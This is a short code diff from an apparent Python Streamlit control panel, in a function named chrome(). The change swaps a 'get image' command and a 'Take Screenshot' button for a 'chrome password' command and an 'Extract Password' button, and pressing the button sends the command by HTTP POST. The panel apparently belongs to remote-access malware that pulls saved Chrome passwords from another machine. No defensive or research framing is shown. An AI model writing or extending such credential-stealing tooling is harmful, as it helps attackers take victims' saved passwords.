@@ -231,9 +231,9 @@ def chrome():
         """,
     ):
         # Message Sending Section
-        message = "get image"
+        message = "chrome password"
         
-        if st.button("Take Screenshot"):
+        if st.button("Extract Password"):
             if message:
                 try:
                     response = requests.post(
